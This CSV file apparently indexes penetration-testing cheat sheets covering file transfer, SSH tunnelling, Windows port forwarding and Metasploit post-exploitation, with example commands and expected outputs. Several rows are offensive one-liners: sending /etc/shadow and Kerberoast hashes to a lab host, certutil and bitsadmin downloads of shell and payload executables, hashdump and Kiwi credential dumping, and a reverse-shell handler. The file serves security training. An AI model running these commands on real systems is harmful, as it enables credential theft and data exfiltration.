"cheatsheet_id","command_id","context","scenario_title","section_title","example","shows"
"file-transfer-cheatsheet","ft-curl-upload","section","","Phase 5: Linux Exfiltration (Data OUT)","curl -X POST -F file=@/etc/shadow http://10.10.14.5:80/upload","100 Continue"
"file-transfer-cheatsheet","ft-nc-send","section","","Phase 5: Linux Exfiltration (Data OUT)","nc 10.10.14.5 4444 < /etc/passwd","Connection established (no error)"
"file-transfer-cheatsheet","ft-scp-download","section","","Phase 5: Linux Exfiltration (Data OUT)","scp user@192.168.45.100:/home/user/proof.txt ./proof.txt","Password/key auth succeeds"
"file-transfer-cheatsheet","ft-nc-receive","section","","Phase 6: Netcat & Raw TCP Transfers","nc -lvnp 4444 > received_file.txt","Listening on 0.0.0.0 <PORT>"
"file-transfer-cheatsheet","ft-nc-send","section","","Phase 6: Netcat & Raw TCP Transfers","nc 10.10.14.5 4444 < /etc/passwd","Connection established (no error)"
"file-transfer-cheatsheet","ft-powershell-tcp-send","section","","Phase 6: Netcat & Raw TCP Transfers","$client = New-Object System.Net.Sockets.TcpClient(""10.10.14.5"", 4444); $stream = $client.GetStream(); $writer = New-Object System.IO.StreamWriter($stream); Get-Content .\hashes.kerberoast | ForEach-Object { $writer.WriteLine($_) }; $writer.Flush(); $client.Close()","No error output"
"file-transfer-cheatsheet","ft-base64-encode","section","","Phase 7: Alternative Methods (Restricted Environments)","base64 -w0 binary.exe","Base64 string output to terminal"
"file-transfer-cheatsheet","ft-bash-dev-tcp","section","","Phase 7: Alternative Methods (Restricted Environments)","cat < /dev/tcp/10.10.14.5/4444 > /tmp/file","File created: ls -la <OUTPUT>"
"file-transfer-cheatsheet","ft-bitsadmin-download","section","","Phase 7: Alternative Methods (Restricted Environments)","bitsadmin /transfer myDownload /download /priority high http://10.10.14.5:8000/payload.exe C:\Windows\Temp\payload.exe","Transfer job completed"
"file-transfer-cheatsheet","ft-scp-upload","section","","Phase 7: Alternative Methods (Restricted Environments)","scp exploit.sh user@192.168.45.100:/tmp/","Password prompt appears (if using password auth)"
"file-transfer-cheatsheet","ft-scp-download","section","","Phase 7: Alternative Methods (Restricted Environments)","scp user@192.168.45.100:/home/user/proof.txt ./proof.txt","Password/key auth succeeds"
"ssh-tunneling-linux","socat-port-forward","scenario","Scenario 1: Socat Port Forward - PostgreSQL Access Through DMZ Host","","",""
"ssh-tunneling-linux","psql-connect","scenario","Scenario 1: Socat Port Forward - PostgreSQL Access Through DMZ Host","","",""
"ssh-tunneling-linux","ssh-local-port-forward","scenario","Scenario 2: SSH Local Port Forward - Multi-Hop SMB Access","","",""
"ssh-tunneling-linux","smbclient-list-shares","scenario","Scenario 2: SSH Local Port Forward - Multi-Hop SMB Access","","",""
"ssh-tunneling-linux","ssh-dynamic-port-forward","scenario","Scenario 3: SSH Dynamic Port Forward - SOCKS Proxy Multi-Target Enumeration","","",""
"ssh-tunneling-linux","proxychains-config","scenario","Scenario 3: SSH Dynamic Port Forward - SOCKS Proxy Multi-Target Enumeration","","",""
"ssh-tunneling-linux","proxychains-nmap","scenario","Scenario 3: SSH Dynamic Port Forward - SOCKS Proxy Multi-Target Enumeration","","",""
"ssh-tunneling-linux","systemctl-start-ssh","scenario","Scenario 4: SSH Remote Port Forward - Bypass Perimeter Firewall","","",""
"ssh-tunneling-linux","ssh-remote-port-forward","scenario","Scenario 4: SSH Remote Port Forward - Bypass Perimeter Firewall","","",""
"ssh-tunneling-linux","psql-connect","scenario","Scenario 4: SSH Remote Port Forward - Bypass Perimeter Firewall","","",""
"ssh-tunneling-linux","ssh-remote-dynamic-port-forward","scenario","Scenario 5: SSH Remote Dynamic Port Forward - Reverse SOCKS Through Firewall","","",""
"ssh-tunneling-linux","proxychains-config","scenario","Scenario 5: SSH Remote Dynamic Port Forward - Reverse SOCKS Through Firewall","","",""
"ssh-tunneling-linux","proxychains-nmap","scenario","Scenario 5: SSH Remote Dynamic Port Forward - Reverse SOCKS Through Firewall","","",""
"ssh-tunneling-linux","ip-addr","section","","Phase 1: Network Reconnaissance & Topology Mapping","ip addr","Output shows interface names (eth0, tun0, wlan0)"
"ssh-tunneling-linux","ip-route","section","","Phase 1: Network Reconnaissance & Topology Mapping","ip route","Output shows routing entries with destination networks"
"ssh-tunneling-linux","ss-listening-ports","section","","Phase 1: Network Reconnaissance & Topology Mapping","ss -ntplu","Output shows listening ports with process names"
"ssh-tunneling-linux","socat-port-forward","section","","Phase 2: Outbound Port Forwarding (Permissive Firewall Environment)","socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432","Output shows 'listening on AF=2 0.0.0.0:<LOCAL_PORT>'"
"ssh-tunneling-linux","ssh-local-port-forward","section","","Phase 2: Outbound Port Forwarding (Permissive Firewall Environment)","ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215","No output after password entry (normal with -N flag)"
"ssh-tunneling-linux","ssh-dynamic-port-forward","section","","Phase 2: Outbound Port Forwarding (Permissive Firewall Environment)","ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215","No output after authentication with -N flag"
"ssh-tunneling-linux","ss-listening-ports","section","","Phase 2: Outbound Port Forwarding (Permissive Firewall Environment)","ss -ntplu","Output shows listening ports with process names"
"ssh-tunneling-linux","systemctl-start-ssh","section","","Phase 3: Reverse Tunneling (Inbound Firewall Restrictions)","sudo systemctl start ssh","Service starts silently (no output = success)"
"ssh-tunneling-linux","ssh-remote-port-forward","section","","Phase 3: Reverse Tunneling (Inbound Firewall Restrictions)","ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4","No output after authentication (normal with -N)"
"ssh-tunneling-linux","ssh-remote-dynamic-port-forward","section","","Phase 3: Reverse Tunneling (Inbound Firewall Restrictions)","ssh -N -R 9998 kali@192.168.118.4","No output after authentication (normal with -N)"
"ssh-tunneling-linux","ss-listening-ports","section","","Phase 3: Reverse Tunneling (Inbound Firewall Restrictions)","ss -ntplu","Output shows listening ports with process names"
"ssh-tunneling-linux","sshuttle-vpn","section","","Phase 4: Advanced Techniques & Troubleshooting","sshuttle -r database_admin@10.4.50.215 172.16.50.0/24 --dns","Connected to server"
"ssh-tunneling-linux","ssh-debug-verbose","section","","Phase 4: Advanced Techniques & Troubleshooting","ssh -vvv database_admin@10.4.50.215","debug1: Authentication succeeded"
"ssh-tunneling-linux","proxychains-config","section","","Phase 4: Advanced Techniques & Troubleshooting","echo 'socks5 127.0.0.1 9999' >> /etc/proxychains4.conf","Line added to /etc/proxychains4.conf under [ProxyList] se..."
"port-forwarding-windows","xfreerdp-connect","scenario","Scenario 1: Windows OpenSSH Remote Dynamic Port Forward - Modern Windows","","",""
"port-forwarding-windows","where-windows","scenario","Scenario 1: Windows OpenSSH Remote Dynamic Port Forward - Modern Windows","","",""
"port-forwarding-windows","ssh-version","scenario","Scenario 1: Windows OpenSSH Remote Dynamic Port Forward - Modern Windows","","",""
"port-forwarding-windows","ssh-remote-dynamic-port-forward","scenario","Scenario 1: Windows OpenSSH Remote Dynamic Port Forward - Modern Windows","","",""
"port-forwarding-windows","proxychains-config","scenario","Scenario 1: Windows OpenSSH Remote Dynamic Port Forward - Modern Windows","","",""
"port-forwarding-windows","proxychains-psql","scenario","Scenario 1: Windows OpenSSH Remote Dynamic Port Forward - Modern Windows","","",""
"port-forwarding-windows","systemctl-start-ssh","scenario","Scenario 2: Plink Remote Port Forward - Legacy Windows Without OpenSSH","","",""
"port-forwarding-windows","apache2-start","scenario","Scenario 2: Plink Remote Port Forward - Legacy Windows Without OpenSSH","","",""
"port-forwarding-windows","powershell-wget","scenario","Scenario 2: Plink Remote Port Forward - Legacy Windows Without OpenSSH","","",""
"port-forwarding-windows","plink-remote-forward","scenario","Scenario 2: Plink Remote Port Forward - Legacy Windows Without OpenSSH","","",""
"port-forwarding-windows","xfreerdp-connect","scenario","Scenario 2: Plink Remote Port Forward - Legacy Windows Without OpenSSH","","",""
"port-forwarding-windows","xfreerdp-connect","scenario","Scenario 3: Netsh Portproxy - Native Windows Admin Port Forwarding","","",""
"port-forwarding-windows","whoami-priv","scenario","Scenario 3: Netsh Portproxy - Native Windows Admin Port Forwarding","","",""
"port-forwarding-windows","netsh-portproxy-add","scenario","Scenario 3: Netsh Portproxy - Native Windows Admin Port Forwarding","","",""
"port-forwarding-windows","netstat-windows","scenario","Scenario 3: Netsh Portproxy - Native Windows Admin Port Forwarding","","",""
"port-forwarding-windows","netsh-portproxy-show","scenario","Scenario 3: Netsh Portproxy - Native Windows Admin Port Forwarding","","",""
"port-forwarding-windows","netsh-firewall-add-rule","scenario","Scenario 3: Netsh Portproxy - Native Windows Admin Port Forwarding","","",""
"port-forwarding-windows","nmap-port-check","scenario","Scenario 3: Netsh Portproxy - Native Windows Admin Port Forwarding","","",""
"port-forwarding-windows","ssh-connect","scenario","Scenario 3: Netsh Portproxy - Native Windows Admin Port Forwarding","","",""
"port-forwarding-windows","netsh-firewall-delete-rule","scenario","Scenario 3: Netsh Portproxy - Native Windows Admin Port Forwarding","","",""
"port-forwarding-windows","netsh-portproxy-delete","scenario","Scenario 3: Netsh Portproxy - Native Windows Admin Port Forwarding","","",""
"port-forwarding-windows","systeminfo-windows","section","","Phase 1: Windows Enumeration & Port Forwarding Capability Assessment","systeminfo","Host Name, OS Name, OS Version displayed"
"port-forwarding-windows","where-windows","section","","Phase 1: Windows Enumeration & Port Forwarding Capability Assessment","where ssh","Full path displayed (e.g., C:\Windows\System32\OpenSSH\ss..."
"port-forwarding-windows","whoami-priv","section","","Phase 1: Windows Enumeration & Port Forwarding Capability Assessment","whoami /priv","Privilege Name column lists available privileges"
"port-forwarding-windows","ipconfig-all","section","","Phase 1: Windows Enumeration & Port Forwarding Capability Assessment","ipconfig /all","Multiple adapters listed (Ethernet, Ethernet 2, etc.)"
"port-forwarding-windows","netsh-firewall-show","section","","Phase 1: Windows Enumeration & Port Forwarding Capability Assessment","netsh advfirewall show allprofiles","Domain Profile Settings"
"port-forwarding-windows","ssh-remote-port-forward","section","","Phase 2: Non-Admin Port Forwarding Techniques (ssh.exe, Plink)","ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4","No output after authentication (normal with -N)"
"port-forwarding-windows","ssh-remote-dynamic-port-forward","section","","Phase 2: Non-Admin Port Forwarding Techniques (ssh.exe, Plink)","ssh -N -R 9998 kali@192.168.118.4","No output after authentication (normal with -N)"
"port-forwarding-windows","plink-remote-forward","section","","Phase 2: Non-Admin Port Forwarding Techniques (ssh.exe, Plink)","plink.exe -ssh -l kali -pw kali -R 9833:172.16.50.217:3389 192.168.45.x","Using username ""<username>"""
"port-forwarding-windows","powershell-wget","section","","Phase 2: Non-Admin Port Forwarding Techniques (ssh.exe, Plink)","powershell wget http://10.10.14.1/nc.exe -OutFile C:\Temp\nc.exe","File transfer completes successfully"
"port-forwarding-windows","certutil-download","section","","Phase 2: Non-Admin Port Forwarding Techniques (ssh.exe, Plink)","certutil -urlcache -f http://10.10.14.5:8000/shell.exe shell.exe","CertUtil: -URLCache command completed successfully"
"port-forwarding-windows","systemctl-start-ssh","section","","Phase 2: Non-Admin Port Forwarding Techniques (ssh.exe, Plink)","sudo systemctl start ssh","Service starts silently (no output = success)"
"port-forwarding-windows","netsh-portproxy-add","section","","Phase 3: Admin Port Forwarding (Netsh) & Forensic Cleanup","netsh interface portproxy add v4tov4 listenport=2222 listenaddress=0.0.0.0 connectport=22 connectaddress=127.0.0.1","Ok."
"port-forwarding-windows","netsh-portproxy-show","section","","Phase 3: Admin Port Forwarding (Netsh) & Forensic Cleanup","netsh interface portproxy show all","Listen on"
"port-forwarding-windows","netsh-portproxy-delete","section","","Phase 3: Admin Port Forwarding (Netsh) & Forensic Cleanup","netsh interface portproxy delete v4tov4 listenport=2222 listenaddress=0.0.0.0","Ok. message"
"port-forwarding-windows","netsh-firewall-add-rule","section","","Phase 3: Admin Port Forwarding (Netsh) & Forensic Cleanup","netsh advfirewall firewall add rule name=""Allow_ReverseShell"" protocol=TCP dir=in localport=4444 action=allow","Ok."
"port-forwarding-windows","netsh-firewall-delete-rule","section","","Phase 3: Admin Port Forwarding (Netsh) & Forensic Cleanup","netsh advfirewall firewall delete rule name=""Allow_ReverseShell""","Ok."
"port-forwarding-windows","netstat-windows","section","","Phase 3: Admin Port Forwarding (Netsh) & Forensic Cleanup","netstat -ano","Proto, Local Address, Foreign Address, State, PID columns..."
"port-forwarding-windows","nmap-port-check","section","","Phase 3: Admin Port Forwarding (Netsh) & Forensic Cleanup","sudo nmap -p 22 -Pn -v 192.168.45.100","PORT STATE SERVICE"
"port-forwarding-windows","whoami-priv","section","","Phase 3: Admin Port Forwarding (Netsh) & Forensic Cleanup","whoami /priv","Privilege Name column lists available privileges"
"metasploit-basics","msf-db-init","scenario","Scenario 1: First-Time Metasploit Setup on Kali","","",""
"metasploit-basics","msf-console-start","scenario","Scenario 1: First-Time Metasploit Setup on Kali","","",""
"metasploit-basics","msf-db-status","scenario","Scenario 1: First-Time Metasploit Setup on Kali","","",""
"metasploit-basics","msf-workspace-add","scenario","Scenario 1: First-Time Metasploit Setup on Kali","","",""
"metasploit-basics","msf-workspace-list","scenario","Scenario 1: First-Time Metasploit Setup on Kali","","",""
"metasploit-basics","msf-workspace-add","scenario","Scenario 2: Workspace Organization for Multi-Target Assessment","","",""
"metasploit-basics","msf-workspace-switch","scenario","Scenario 2: Workspace Organization for Multi-Target Assessment","","",""
"metasploit-basics","msf-db-import","scenario","Scenario 2: Workspace Organization for Multi-Target Assessment","","",""
"metasploit-basics","msf-hosts-list","scenario","Scenario 2: Workspace Organization for Multi-Target Assessment","","",""
"metasploit-basics","msf-workspace-list","scenario","Scenario 2: Workspace Organization for Multi-Target Assessment","","",""
"metasploit-basics","msf-search-keyword","scenario","Scenario 3: Module Discovery and Selection Workflow","","",""
"metasploit-basics","msf-use-module","scenario","Scenario 3: Module Discovery and Selection Workflow","","",""
"metasploit-basics","msf-show-options","scenario","Scenario 3: Module Discovery and Selection Workflow","","",""
"metasploit-basics","msf-info-module","scenario","Scenario 3: Module Discovery and Selection Workflow","","",""
"metasploit-basics","msf-show-payloads","scenario","Scenario 3: Module Discovery and Selection Workflow","","",""
"metasploit-basics","msf-search-cve","scenario","Scenario 3: Module Discovery and Selection Workflow","","",""
"metasploit-basics","msf-db-import","scenario","Scenario 4: Nmap Integration and Database-Driven Enumeration","","",""
"metasploit-basics","msf-hosts-list","scenario","Scenario 4: Nmap Integration and Database-Driven Enumeration","","",""
"metasploit-basics","msf-services-list","scenario","Scenario 4: Nmap Integration and Database-Driven Enumeration","","",""
"metasploit-basics","msf-services-filter-port","scenario","Scenario 4: Nmap Integration and Database-Driven Enumeration","","",""
"metasploit-basics","msf-use-module","scenario","Scenario 4: Nmap Integration and Database-Driven Enumeration","","",""
"metasploit-basics","msf-set-option","scenario","Scenario 4: Nmap Integration and Database-Driven Enumeration","","",""
"metasploit-basics","msf-db-init","section","","Phase 1: Initial Setup (One-Time Configuration)","sudo msfdb init","Starting database"
"metasploit-basics","msf-db-status","section","","Phase 1: Initial Setup (One-Time Configuration)","db_status","Connected to msf"
"metasploit-basics","msf-console-start","section","","Phase 1: Initial Setup (One-Time Configuration)","msfconsole -q","msf6 > prompt appears"
"metasploit-basics","msf-workspace-add","section","","Phase 2: Workspace Management (Per Engagement)","","See command documentation"
"metasploit-basics","msf-workspace-list","section","","Phase 2: Workspace Management (Per Engagement)","workspace","Workspace list displayed"
"metasploit-basics","msf-workspace-switch","section","","Phase 2: Workspace Management (Per Engagement)","workspace client_pentest_2024","Workspace: <name> (confirmation message)"
"metasploit-basics","msf-workspace-delete","section","","Phase 2: Workspace Management (Per Engagement)","","See command documentation"
"metasploit-basics","msf-db-import","section","","Phase 3: Reconnaissance Import (After Nmap)","db_import /home/kali/scans/network.xml","Importing data..."
"metasploit-basics","msf-hosts-list","section","","Phase 3: Reconnaissance Import (After Nmap)","","See command documentation"
"metasploit-basics","msf-services-list","section","","Phase 3: Reconnaissance Import (After Nmap)","","See command documentation"
"metasploit-basics","msf-services-filter-port","section","","Phase 3: Reconnaissance Import (After Nmap)","","See command documentation"
"metasploit-basics","msf-search-keyword","section","","Phase 4: Module Discovery (Target Selection)","","See command documentation"
"metasploit-basics","msf-search-type","section","","Phase 4: Module Discovery (Target Selection)","","See command documentation"
"metasploit-basics","msf-search-platform","section","","Phase 4: Module Discovery (Target Selection)","","See command documentation"
"metasploit-basics","msf-search-cve","section","","Phase 4: Module Discovery (Target Selection)","","See command documentation"
"metasploit-basics","msf-info-module","section","","Phase 4: Module Discovery (Target Selection)","info exploit/windows/smb/ms17_010_eternalblue","Module details displayed (Name, Module, License, Rank, etc)"
"metasploit-basics","msf-use-module","section","","Phase 5: Module Configuration (Pre-Execution)","use exploit/multi/handler","Prompt changes to show module type and path"
"metasploit-basics","msf-show-options","section","","Phase 5: Module Configuration (Pre-Execution)","show options","Options table displayed with columns: Name, Current Setti..."
"metasploit-basics","msf-set-option","section","","Phase 5: Module Configuration (Pre-Execution)","set RHOSTS 192.168.45.100","OPTION => VALUE confirmation message"
"metasploit-basics","msf-show-advanced","section","","Phase 5: Module Configuration (Pre-Execution)","","See command documentation"
"metasploit-post-exploit","meterpreter-sysinfo","scenario","Scenario 1: Initial Meterpreter Enumeration and Process Migration","","",""
"metasploit-post-exploit","meterpreter-getuid","scenario","Scenario 1: Initial Meterpreter Enumeration and Process Migration","","",""
"metasploit-post-exploit","meterpreter-getprivs","scenario","Scenario 1: Initial Meterpreter Enumeration and Process Migration","","",""
"metasploit-post-exploit","meterpreter-ps","scenario","Scenario 1: Initial Meterpreter Enumeration and Process Migration","","",""
"metasploit-post-exploit","meterpreter-migrate","scenario","Scenario 1: Initial Meterpreter Enumeration and Process Migration","","",""
"metasploit-post-exploit","meterpreter-getpid","scenario","Scenario 1: Initial Meterpreter Enumeration and Process Migration","","",""
"metasploit-post-exploit","meterpreter-getsystem","scenario","Scenario 2: Windows Privilege Escalation with getsystem and Exploit Suggester","","",""
"metasploit-post-exploit","meterpreter-getuid","scenario","Scenario 2: Windows Privilege Escalation with getsystem and Exploit Suggester","","",""
"metasploit-post-exploit","msf-session-background","scenario","Scenario 2: Windows Privilege Escalation with getsystem and Exploit Suggester","","",""
"metasploit-post-exploit","meterpreter-hashdump","scenario","Scenario 3: Credential Harvesting with Mimikatz and Kiwi","","",""
"metasploit-post-exploit","meterpreter-load-kiwi","scenario","Scenario 3: Credential Harvesting with Mimikatz and Kiwi","","",""
"metasploit-post-exploit","meterpreter-kiwi-creds-all","scenario","Scenario 3: Credential Harvesting with Mimikatz and Kiwi","","",""
"metasploit-post-exploit","meterpreter-ipconfig","scenario","Scenario 4: Pivoting and Network Routing","","",""
"metasploit-post-exploit","meterpreter-route-add","scenario","Scenario 4: Pivoting and Network Routing","","",""
"metasploit-post-exploit","msf-session-background","scenario","Scenario 4: Pivoting and Network Routing","","",""
"metasploit-post-exploit","meterpreter-upload","scenario","Scenario 5: Persistence Mechanisms for Long-Term Access","","",""
"metasploit-post-exploit","meterpreter-shell","scenario","Scenario 5: Persistence Mechanisms for Long-Term Access","","",""
"metasploit-post-exploit","msf-handler-background","scenario","Scenario 5: Persistence Mechanisms for Long-Term Access","","",""
"metasploit-post-exploit","meterpreter-sysinfo","section","","Phase 1: Initial Enumeration (First 5 Minutes Post-Exploit)","sysinfo","Computer name displayed"
"metasploit-post-exploit","meterpreter-getuid","section","","Phase 1: Initial Enumeration (First 5 Minutes Post-Exploit)","getuid","Server username displayed (DOMAIN\user format on Windows)"
"metasploit-post-exploit","meterpreter-getprivs","section","","Phase 1: Initial Enumeration (First 5 Minutes Post-Exploit)","getprivs","Enabled Process Privileges list"
"metasploit-post-exploit","meterpreter-ps","section","","Phase 1: Initial Enumeration (First 5 Minutes Post-Exploit)","ps","Process list with columns: PID, PPID, Name, Arch, Session..."
"metasploit-post-exploit","meterpreter-migrate","section","","Phase 1: Initial Enumeration (First 5 Minutes Post-Exploit)","migrate 1234","Migrating from <OLD_PID> to <NEW_PID>"
"metasploit-post-exploit","meterpreter-getsystem","section","","Phase 2: Privilege Escalation (If Not Already SYSTEM)","getsystem","got system via technique N"
"metasploit-post-exploit","meterpreter-getuid","section","","Phase 2: Privilege Escalation (If Not Already SYSTEM)","getuid","Server username displayed (DOMAIN\user format on Windows)"
"metasploit-post-exploit","meterpreter-hashdump","section","","Phase 3: Credential Harvesting (Post-Escalation)","hashdump","Username:RID:LM_hash:NTLM_hash::: format"
"metasploit-post-exploit","meterpreter-load-kiwi","section","","Phase 3: Credential Harvesting (Post-Escalation)","load kiwi","Mimikatz ASCII art displayed"
"metasploit-post-exploit","meterpreter-kiwi-creds-all","section","","Phase 3: Credential Harvesting (Post-Escalation)","creds_all","Credentials table with Username, Domain, NTLM, SHA1"
"metasploit-post-exploit","meterpreter-ipconfig","section","","Phase 4: Pivoting Setup (Multi-Network Environments)","","See command documentation"
"metasploit-post-exploit","meterpreter-route-add","section","","Phase 4: Pivoting Setup (Multi-Network Environments)","run autoroute -s 172.16.5.0/24","Route added successfully"
"metasploit-post-exploit","meterpreter-upload","section","","Phase 5: Persistence Installation (Long-Term Access)","upload /usr/bin/unix-privesc-check C:\Temp\privesc.exe","Uploading: <file>"
"metasploit-post-exploit","meterpreter-shell","section","","Phase 5: Persistence Installation (Long-Term Access)","shell","Process created"
"metasploit-post-exploit","msf-handler-background","section","","Phase 5: Persistence Installation (Long-Term Access)","use exploit/multi/handler; set payload linux/x64/meterpreter_reverse_tcp; set LHOST 192.168.45.5; set LPORT 443; run -j","Exploit running as background job <ID>"
"metasploit-post-exploit","meterpreter-hashdump","section","","Phase 6: Post-Exploitation Documentation and Cleanup","hashdump","Username:RID:LM_hash:NTLM_hash::: format"
